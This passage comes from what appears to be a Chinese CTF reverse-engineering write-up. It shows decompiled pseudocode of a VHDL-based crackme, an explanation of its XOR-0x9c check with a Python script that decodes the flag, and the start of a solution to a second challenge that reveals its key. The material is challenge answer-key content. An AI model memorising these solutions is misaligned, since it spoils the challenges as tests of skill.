class="line"></span><br><span class="line">          <span class="built_in">sub_55CFAE532C32</span>(v38);</span><br><span class="line"></span><br><span class="line">          v39 = <span class="built_in">sub_55CFAE532BBC</span>();</span><br><span class="line"></span><br><span class="line">          v82 = *v3;</span><br><span class="line"></span><br><span class="line">          v83 = *(_QWORD *)(a1 + <span class="number">248</span>);</span><br><span class="line"></span><br><span class="line">          <span class="built_in">sub_55CFAE51B790</span>(&amp;v82);</span><br><span class="line"></span><br><span class="line">          v40 = v83;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">          v79[<span class="number">0</span>] = *(_QWORD *)(a1 + <span class="number">248</span>);</span><br><span class="line"></span><br><span class="line">          v101[<span class="number">0</span>] = (__int64)<span class="string">&quot;Wrong!&quot;</span>;</span><br><span class="line"></span><br><span class="line">          v101[<span class="number">1</span>] = (__int64)&amp;unk_55CFAE5CC698;</span><br><span class="line"></span><br><span class="line">          v79[<span class="number">1</span>] = (__int64)v101;</span><br><span class="line"></span><br><span class="line">          v80 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">          v81 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">          <span class="built_in">sub_55CFAE51BF90</span>(v79);</span><br><span class="line"></span><br><span class="line">          *(_QWORD *)(a1 + <span class="number">248</span>) = v79[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">          <span class="built_in">sub_55CFAE532C32</span>(v38);</span><br><span class="line"></span><br><span class="line">          v39 = <span class="built_in">sub_55CFAE532BBC</span>();</span><br><span class="line"></span><br><span class="line">          v77 = *v3;</span><br><span class="line"></span><br><span class="line">          v78 = *(_QWORD *)(a1 + <span class="number">248</span>);</span><br><span class="line"></span><br><span class="line">          <span class="built_in">sub_55CFAE51B790</span>(&amp;v77);</span><br><span class="line"></span><br><span class="line">          v40 = v78;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        *(_QWORD *)(a1 + <span class="number">248</span>) = v40;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">sub_55CFAE532C32</span>(v39);</span><br><span class="line"></span><br><span class="line">        result = <span class="built_in">sub_55CFAE533790</span>();</span><br><span class="line"></span><br><span class="line">        *(_DWORD *)(a1 + <span class="number">276</span>) = <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line"></span><br><span class="line">        v41 = <span class="built_in">sub_55CFAE532BBC</span>();</span><br><span class="line"></span><br><span class="line">        v69 = *(_QWORD *)(a1 + <span class="number">240</span>);</span><br><span class="line"></span><br><span class="line">        v70 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">sub_55CFAE519B90</span>(&amp;v69);</span><br><span class="line"></span><br><span class="line">        *(_QWORD *)(a1 + <span class="number">240</span>) = v69;</span><br><span class="line"></span><br><span class="line">        *(_BYTE *)(a1 + <span class="number">264</span>) = v70;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">sub_55CFAE532C32</span>(v41);</span><br><span class="line"></span><br><span class="line">        *(_DWORD *)(a1 + <span class="number">268</span>) = *(<span class="type">unsigned</span> __int8 *)(a1 + <span class="number">264</span>);</span><br><span class="line"></span><br><span class="line">        v42 = <span class="built_in">sub_55CFAE532BBC</span>();</span><br><span class="line"></span><br><span class="line">        v43 = *(_DWORD *)(a1 + <span class="number">268</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( v43 &lt; <span class="number">0</span> )</span><br><span class="line"></span><br><span class="line">          <span class="built_in">sub_55CFAE53CDDA</span>(<span class="string">&quot;hello.vhdl&quot;</span>, <span class="number">48LL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">sub_55CFAE5131D0</span>(&amp;v127, (<span class="type">unsigned</span> <span class="type">int</span>)v43, <span class="number">8LL</span>);</span><br><span class="line"></span><br><span class="line">        v87 = v127;</span><br><span class="line"></span><br><span class="line">        v88 = v66;</span><br><span class="line"></span><br><span class="line">        v66[<span class="number">0</span>] = *(_DWORD *)v128;</span><br><span class="line"></span><br><span class="line">        v66[<span class="number">1</span>] = *(_DWORD *)(v128 + <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">        v67 = *(_BYTE *)(v128 + <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">        v68 = *(_DWORD *)(v128 + <span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( v68 != <span class="number">8</span> )</span><br><span class="line"></span><br><span class="line">          <span class="built_in">sub_55CFAE53CDDA</span>(<span class="string">&quot;hello.vhdl&quot;</span>, <span class="number">48LL</span>);</span><br><span class="line"></span><br><span class="line">        v44 = v87;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="number">0LL</span>; (<span class="type">unsigned</span> <span class="type">int</span>)i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">          v46 = *(_BYTE **)(a1 + <span class="number">8</span> * i + <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">          *(_BYTE *)(a1 + i + <span class="number">288</span>) = *(_BYTE *)(v44 + i);</span><br><span class="line"></span><br><span class="line">          v47 = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> ( !v46[<span class="number">42</span>] )</span><br><span class="line"></span><br><span class="line">            v47 = *v46 != *(_BYTE *)(a1 + i + <span class="number">288</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> ( v47 )</span><br><span class="line"></span><br><span class="line">            <span class="built_in">sub_55CFAE523B0A</span>();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">sub_55CFAE532C32</span>(v42);</span><br><span class="line"></span><br><span class="line">        result = <span class="built_in">sub_55CFAE53381E</span>(<span class="number">1000000LL</span>, <span class="string">&quot;hello.vhdl&quot;</span>, <span class="number">49LL</span>);</span><br><span class="line"></span><br><span class="line">        *(_DWORD *)(a1 + <span class="number">276</span>) = <span class="number">7</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( *(<span class="type">int</span> *)(a1 + <span class="number">280</span>) &gt; <span class="number">0</span> &amp;&amp; *(<span class="type">int</span> *)(a1 + <span class="number">280</span>) &lt; <span class="number">9</span> )</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">          v7 = v3;</span><br><span class="line"></span><br><span class="line">          v126[<span class="number">0</span>] = a1 + <span class="number">152</span>;</span><br><span class="line"></span><br><span class="line">          v126[<span class="number">1</span>] = (__int64)&amp;asc_55CFAE5CC<span class="number">3E0</span>[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line">          v8 = <span class="built_in">sub_55CFAE532BBC</span>();</span><br><span class="line"></span><br><span class="line">          v9 = *(_DWORD *)(a1 + <span class="number">280</span>) - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> ( v9 &gt;= <span class="number">8</span> )</span><br><span class="line"></span><br><span class="line">            <span class="built_in">sub_55CFAE53D036</span>(<span class="string">&quot;hello.vhdl&quot;</span>, <span class="number">51LL</span>, v9, v76);</span><br><span class="line"></span><br><span class="line">          v10 = dword_55CFAE5CC420[v9];</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> ( v10 &lt; <span class="number">0</span> )</span><br><span class="line"></span><br><span class="line">            <span class="built_in">sub_55CFAE53CDDA</span>(<span class="string">&quot;hello.vhdl&quot;</span>, <span class="number">51LL</span>);</span><br><span class="line"></span><br><span class="line">          <span class="built_in">sub_55CFAE5131D0</span>(&amp;v124, (<span class="type">unsigned</span> <span class="type">int</span>)v10, <span class="number">8LL</span>);</span><br><span class="line"></span><br><span class="line">          v123[<span class="number">0</span>] = v124;</span><br><span class="line"></span><br><span class="line">          v123[<span class="number">1</span>] = (__int64)v63;</span><br><span class="line"></span><br><span class="line">          v63[<span class="number">0</span>] = *(_DWORD *)v125;</span><br><span class="line"></span><br><span class="line">          v63[<span class="number">1</span>] = *(_DWORD *)(v125 + <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">          v64 = *(_BYTE *)(v125 + <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">          v65 = *(_DWORD *)(v125 + <span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">          v11 = <span class="built_in">sub_55CFAE4FC140</span>(v126, v123);</span><br><span class="line"></span><br><span class="line">          <span class="built_in">sub_55CFAE532C32</span>(v8);</span><br><span class="line"></span><br><span class="line">          v3 = v7;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> ( (v11 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line"></span><br><span class="line">            ++*(_DWORD *)(a1 + <span class="number">272</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( *(<span class="type">int</span> *)(a1 + <span class="number">280</span>) &gt;= <span class="number">9</span> &amp;&amp; *(<span class="type">int</span> *)(a1 + <span class="number">280</span>) &lt; <span class="number">17</span> )</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">          v122[<span class="number">0</span>] = a1 + <span class="number">152</span>;</span><br><span class="line"></span><br><span class="line">          v122[<span class="number">1</span>] = (__int64)&amp;asc_55CFAE5CC<span class="number">3E0</span>[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line">          v12 = <span class="built_in">sub_55CFAE532BBC</span>();</span><br><span class="line"></span><br><span class="line">          v13 = *(_DWORD *)(a1 + <span class="number">280</span>) - <span class="number">9</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> ( v13 &gt;= <span class="number">8</span> )</span><br><span class="line"></span><br><span class="line">            <span class="built_in">sub_55CFAE53D036</span>(<span class="string">&quot;hello.vhdl&quot;</span>, <span class="number">56LL</span>, v13, v75);</span><br><span class="line"></span><br><span class="line">          v14 = dword_55CFAE5CC460[v13];</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> ( v14 &lt; <span class="number">0</span> )</span><br><span class="line"></span><br><span class="line">            <span class="built_in">sub_55CFAE53CDDA</span>(<span class="string">&quot;hello.vhdl&quot;</span>, <span class="number">56LL</span>);</span><br><span class="line"></span><br><span class="line">          <span class="built_in">sub_55CFAE5131D0</span>(&amp;v120, (<span class="type">unsigned</span> <span class="type">int</span>)v14, <span class="number">8LL</span>);</span><br><span class="line"></span><br><span class="line">          v119[<span class="number">0</span>] = v120;</span><br><span class="line"></span><br><span class="line">          v119[<span class="number">1</span>] = (__int64)v60;</span><br><span class="line"></span><br><span class="line">          v60[<span class="number">0</span>] = *(_DWORD *)v121;</span><br><span class="line"></span><br><span class="line">          v60[<span class="number">1</span>] = *(_DWORD *)(v121 + <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">          v61 = *(_BYTE *)(v121 + <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">          v62 = *(_DWORD *)(v121 + <span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">          v15 = <span class="built_in">sub_55CFAE4FC140</span>(v122, v119);</span><br><span class="line"></span><br><span class="line">          <span class="built_in">sub_55CFAE532C32</span>(v12);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> ( (v15 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line"></span><br><span class="line">            ++*(_DWORD *)(a1 + <span class="number">272</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( *(<span class="type">int</span> *)(a1 + <span class="number">280</span>) &gt;= <span class="number">17</span> &amp;&amp; *(<span class="type">int</span> *)(a1 + <span class="number">280</span>) &lt; <span class="number">25</span> )</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">          v118[<span class="number">0</span>] = a1 + <span class="number">152</span>;</span><br><span class="line"></span><br><span class="line">          v118[<span class="number">1</span>] = (__int64)&amp;asc_55CFAE5CC<span class="number">3E0</span>[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line">          v16 = <span class="built_in">sub_55CFAE532BBC</span>();</span><br><span class="line"></span><br><span class="line">          v17 = *(_DWORD *)(a1 + <span class="number">280</span>) - <span class="number">17</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> ( v17 &gt;= <span class="number">8</span> )</span><br><span class="line"></span><br><span class="line">            <span class="built_in">sub_55CFAE53D036</span>(<span class="string">&quot;hello.vhdl&quot;</span>, <span class="number">61LL</span>, v17, v74);</span><br><span class="line"></span><br><span class="line">          v18 = dword_55CFAE5CC4A0[v17];</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> ( v18 &lt; <span class="number">0</span> )</span><br><span class="line"></span><br><span class="line">            <span class="built_in">sub_55CFAE53CDDA</span>(<span class="string">&quot;hello.vhdl&quot;</span>, <span class="number">61LL</span>);</span><br><span class="line"></span><br><span class="line">          <span class="built_in">sub_55CFAE5131D0</span>(&amp;v116, (<span class="type">unsigned</span> <span class="type">int</span>)v18, <span class="number">8LL</span>);</span><br><span class="line"></span><br><span class="line">          v115[<span class="number">0</span>] = v116;</span><br><span class="line"></span><br><span class="line">          v115[<span class="number">1</span>] = (__int64)v57;</span><br><span class="line"></span><br><span class="line">          v57[<span class="number">0</span>] = *(_DWORD *)v117;</span><br><span class="line"></span><br><span class="line">          v57[<span class="number">1</span>] = *(_DWORD *)(v117 + <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">          v58 = *(_BYTE *)(v117 + <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">          v59 = *(_DWORD *)(v117 + <span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">          v19 = <span class="built_in">sub_55CFAE4FC140</span>(v118, v115);</span><br><span class="line"></span><br><span class="line">          <span class="built_in">sub_55CFAE532C32</span>(v16);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> ( (v19 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line"></span><br><span class="line">            ++*(_DWORD *)(a1 + <span class="number">272</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( *(<span class="type">int</span> *)(a1 + <span class="number">280</span>) &gt;= <span class="number">25</span> &amp;&amp; *(<span class="type">int</span> *)(a1 + <span class="number">280</span>) &lt; <span class="number">33</span> )</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">          v114[<span class="number">0</span>] = a1 + <span class="number">152</span>;</span><br><span class="line"></span><br><span class="line">          v114[<span class="number">1</span>] = (__int64)&amp;asc_55CFAE5CC<span class="number">3E0</span>[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line">          v20 = <span class="built_in">sub_55CFAE532BBC</span>();</span><br><span class="line"></span><br><span class="line">          v21 = *(_DWORD *)(a1 + <span class="number">280</span>) - <span class="number">25</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> ( v21 &gt;= <span class="number">8</span> )</span><br><span class="line"></span><br><span class="line">            <span class="built_in">sub_55CFAE53D036</span>(<span class="string">&quot;hello.vhdl&quot;</span>, <span class="number">66LL</span>, v21, v73);</span><br><span class="line"></span><br><span class="line">          v22 = dword_55CFAE5CC<span class="number">4E0</span>[v21];</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> ( v22 &lt; <span class="number">0</span> )</span><br><span class="line"></span><br><span class="line">            <span class="built_in">sub_55CFAE53CDDA</span>(<span class="string">&quot;hello.vhdl&quot;</span>, <span class="number">66LL</span>);</span><br><span class="line"></span><br><span class="line">          <span class="built_in">sub_55CFAE5131D0</span>(&amp;v112, (<span class="type">unsigned</span> <span class="type">int</span>)v22, <span class="number">8LL</span>);</span><br><span class="line"></span><br><span class="line">          v111[<span class="number">0</span>] = v112;</span><br><span class="line"></span><br><span class="line">          v111[<span class="number">1</span>] = (__int64)v54;</span><br><span class="line"></span><br><span class="line">          v54[<span class="number">0</span>] = *(_DWORD *)v113;</span><br><span class="line"></span><br><span class="line">          v54[<span class="number">1</span>] = *(_DWORD *)(v113 + <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">          v55 = *(_BYTE *)(v113 + <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">          v56 = *(_DWORD *)(v113 + <span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">          v23 = <span class="built_in">sub_55CFAE4FC140</span>(v114, v111);</span><br><span class="line"></span><br><span class="line">          <span class="built_in">sub_55CFAE532C32</span>(v20);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> ( (v23 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line"></span><br><span class="line">            ++*(_DWORD *)(a1 + <span class="number">272</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( *(<span class="type">int</span> *)(a1 + <span class="number">280</span>) &gt;= <span class="number">33</span> &amp;&amp; *(<span class="type">int</span> *)(a1 + <span class="number">280</span>) &lt; <span class="number">41</span> )</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">          v110[<span class="number">0</span>] = a1 + <span class="number">152</span>;</span><br><span class="line"></span><br><span class="line">          v110[<span class="number">1</span>] = (__int64)&amp;asc_55CFAE5CC<span class="number">3E0</span>[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line">          v24 = <span class="built_in">sub_55CFAE532BBC</span>();</span><br><span class="line"></span><br><span class="line">          v25 = *(_DWORD *)(a1 + <span class="number">280</span>) - <span class="number">33</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> ( v25 &gt;= <span class="number">8</span> )</span><br><span class="line"></span><br><span class="line">            <span class="built_in">sub_55CFAE53D036</span>(<span class="string">&quot;hello.vhdl&quot;</span>, <span class="number">71LL</span>, v25, v72);</span><br><span class="line"></span><br><span class="line">          v26 = dword_55CFAE5CC520[v25];</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> ( v26 &lt; <span class="number">0</span> )</span><br><span class="line"></span><br><span class="line">            <span class="built_in">sub_55CFAE53CDDA</span>(<span class="string">&quot;hello.vhdl&quot;</span>, <span class="number">71LL</span>);</span><br><span class="line"></span><br><span class="line">          <span class="built_in">sub_55CFAE5131D0</span>(&amp;v108, (<span class="type">unsigned</span> <span class="type">int</span>)v26, <span class="number">8LL</span>);</span><br><span class="line"></span><br><span class="line">          v107[<span class="number">0</span>] = v108;</span><br><span class="line"></span><br><span class="line">          v107[<span class="number">1</span>] = (__int64)v51;</span><br><span class="line"></span><br><span class="line">          v51[<span class="number">0</span>] = *(_DWORD *)v109;</span><br><span class="line"></span><br><span class="line">          v51[<span class="number">1</span>] = *(_DWORD *)(v109 + <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">          v52 = *(_BYTE *)(v109 + <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">          v53 = *(_DWORD *)(v109 + <span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">          v27 = <span class="built_in">sub_55CFAE4FC140</span>(v110, v107);</span><br><span class="line"></span><br><span class="line">          <span class="built_in">sub_55CFAE532C32</span>(v24);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> ( (v27 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line"></span><br><span class="line">            ++*(_DWORD *)(a1 + <span class="number">272</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        v28 = *(_DWORD *)(a1 + <span class="number">280</span>);</span><br><span class="line"></span><br><span class="line">        v29 = v28 &gt; <span class="number">40</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( v28 &gt;= <span class="number">41</span> )</span><br><span class="line"></span><br><span class="line">          v29 = *(_DWORD *)(a1 + <span class="number">280</span>) &lt; <span class="number">49</span>;</span><br><span class="line"></span><br><span class="line">        v2 = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( v29 )</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">          v106[<span class="number">0</span>] = a1 + <span class="number">152</span>;</span><br><span class="line"></span><br><span class="line">          v106[<span class="number">1</span>] = (__int64)&amp;asc_55CFAE5CC<span class="number">3E0</span>[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line">          v30 = <span class="built_in">sub_55CFAE532BBC</span>();</span><br><span class="line"></span><br><span class="line">          v31 = *(_DWORD *)(a1 + <span class="number">280</span>) - <span class="number">41</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> ( v31 &gt;= <span class="number">8</span> )</span><br><span class="line"></span><br><span class="line">            <span class="built_in">sub_55CFAE53D036</span>(<span class="string">&quot;hello.vhdl&quot;</span>, <span class="number">76LL</span>, v31, v71);</span><br><span class="line"></span><br><span class="line">          v32 = dword_55CFAE5CC560[v31];</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> ( v32 &lt; <span class="number">0</span> )</span><br><span class="line"></span><br><span class="line">            <span class="built_in">sub_55CFAE53CDDA</span>(<span class="string">&quot;hello.vhdl&quot;</span>, <span class="number">76LL</span>);</span><br><span class="line"></span><br><span class="line">          <span class="built_in">sub_55CFAE5131D0</span>(&amp;v104, (<span class="type">unsigned</span> <span class="type">int</span>)v32, <span class="number">8LL</span>);</span><br><span class="line"></span><br><span class="line">          v103[<span class="number">0</span>] = v104;</span><br><span class="line"></span><br><span class="line">          v103[<span class="number">1</span>] = (__int64)v48;</span><br><span class="line"></span><br><span class="line">          v48[<span class="number">0</span>] = *(_DWORD *)v105;</span><br><span class="line"></span><br><span class="line">          v48[<span class="number">1</span>] = *(_DWORD *)(v105 + <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">          v49 = *(_BYTE *)(v105 + <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">          v50 = *(_DWORD *)(v105 + <span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">          v33 = <span class="built_in">sub_55CFAE4FC140</span>(v106, v103);</span><br><span class="line"></span><br><span class="line">          <span class="built_in">sub_55CFAE532C32</span>(v30);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> ( (v33 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line"></span><br><span class="line">            ++*(_DWORD *)(a1 + <span class="number">272</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line"></span><br><span class="line">        <span class="built_in">sub_55CFAE53CB90</span>(<span class="string">&quot;hello.vhdl&quot;</span>, <span class="number">88LL</span>, <span class="number">6LL</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line"></span><br><span class="line">        <span class="built_in">sub_55CFAE53CB90</span>(<span class="string">&quot;hello.vhdl&quot;</span>, <span class="number">21LL</span>, <span class="number">6LL</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一共就是几个case分支，可以看到case0是输入，case2是输出错误。</p>
<p>case4就是for(int i &#x3D; 0; i &lt; 44; i++)</p>
<p>case5是最后比较，即看有多少个输入是正确的，当为44时则输出correct。</p>
<p><img src="./20211121175536714.jpg" alt="img"></p>
<p>case6是加密函数，case7就是对单字节加密结果比较了。</p>
<p>密文在case7的分组来的，如第一组密文在如下箭头的地方：</p>
<p><img src="./20211121175536165.jpg" alt="img"></p>
<p>这里还有一点要说的就是程序的<strong>sub_5585B8E481D0</strong>函数是把数据转化为二进制，但是1用3代替，0用2代替的。</p>
<p>然后这里加密操作，猜测的是异或，因为输入数据在经过case6是变化过的。然后从测试的数据输入与输出得到异或值：0x9c</p>
<p>如我输入的字符7，经过转化后变为了22332333，然后22332333变为了32323233，即0x37变为了0xAB，那么从这可推出：0x37^0xab &#x3D; 0x9c</p>
<p>最后提取出所有密文解密即可：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">enc = [<span class="number">216</span>, <span class="number">221</span>, <span class="number">207</span>, <span class="number">223</span>, <span class="number">200</span>, <span class="number">218</span>, <span class="number">231</span>, <span class="number">172</span>, <span class="number">170</span>, <span class="number">174</span>, <span class="number">165</span>, <span class="number">173</span>, <span class="number">165</span>, <span class="number">170</span>, <span class="number">174</span>, <span class="number">177</span>, <span class="number">253</span>, <span class="number">254</span>, <span class="number">253</span>, <span class="number">248</span>, <span class="number">177</span>, <span class="number">168</span>, <span class="number">172</span>, <span class="number">255</span>, <span class="number">164</span>, <span class="number">177</span>, <span class="number">164</span>, <span class="number">175</span>, <span class="number">173</span>, <span class="number">164</span>, <span class="number">177</span>, <span class="number">250</span>, <span class="number">172</span>, <span class="number">253</span>, <span class="number">170</span>, <span class="number">254</span>, <span class="number">173</span>, <span class="number">164</span>, <span class="number">170</span>, <span class="number">168</span>, <span class="number">164</span>, <span class="number">174</span>, <span class="number">255</span>, <span class="number">225</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(enc[i]^<span class="number">0x9c</span>), end = <span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3><span id="xu-jia-de-fen-si">虚假的粉丝</span><a href="#xu-jia-de-fen-si" class="header-anchor"></a></h3><blockquote>
<p>你是真的粉丝还是虚假的粉丝？</p>
</blockquote>
<p><img src="./20211121175536171.jpg" alt="img"></p>
<p><img src="./20211121175536245.jpg" alt="img"></p>
<p>ASCII-faded 1999.txt</p>
<p><img src="./20211121175536493.jpg" alt="img"></p>
<p>key1 和 key2 可以从上面得到（当然也可以逆向出）</p>
<p>Final key 足够大就行了</p>
<p><img src="https://txq2mmofcw.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGJjMGUyYWQ2YWE3NDgyYWRhNjNjZDM1MGVkZjJiOGRfRTE2YVRhMVBDbThtbE1DdFoxWVNFdEhVZjlrV1kxaXpfVG9rZW46Ym94Y25jWWhDZ3JrUUxTbkZCOGJ5V0gyOGViXzE2Mzc0ODg1MzA6MTYzNzQ5MjEzMF9WNA" alt="img"></p>
<p><img src="./20211121175536234.jpg" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S3Cre7_K3y = Al4N_wAlK3RX</span><br></pre></td></tr></table></figure>

<p>按照逆向的逻辑写脚本（其实等他命令行里播放完看这个文件也行</p>
<p>Exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &gt;&gt;&gt; (hex(ord(&#x27;A&#x27;)) + hex(ord(&#x27;W&#x27;))).replace(&quot;0x&quot;, &quot;&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x27;4157&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &gt;&gt;&gt; ord(&#x27;F&#x27;) + ord(&#x27;a&#x27;) + ord(&#x27;d&#x27;) + ord(&#x27;e&#x27;) + ord(&#x27;d&#x27;) + ord(&#x27;i&#x27;) + ord(&#x27;s&#x27;) + ord(&#x27;b&#x27;) + ord(&#x27;e&#x27;) + ord(&#x27;s&#x27;) + ord(&#x27;t&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1118</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./f/ASCII-faded 5315.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> fin:</span><br><span class="line"></span><br><span class="line">    f = fin.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = <span class="string">b&quot;Al4N_wAlK3RX&quot;</span></span><br><span 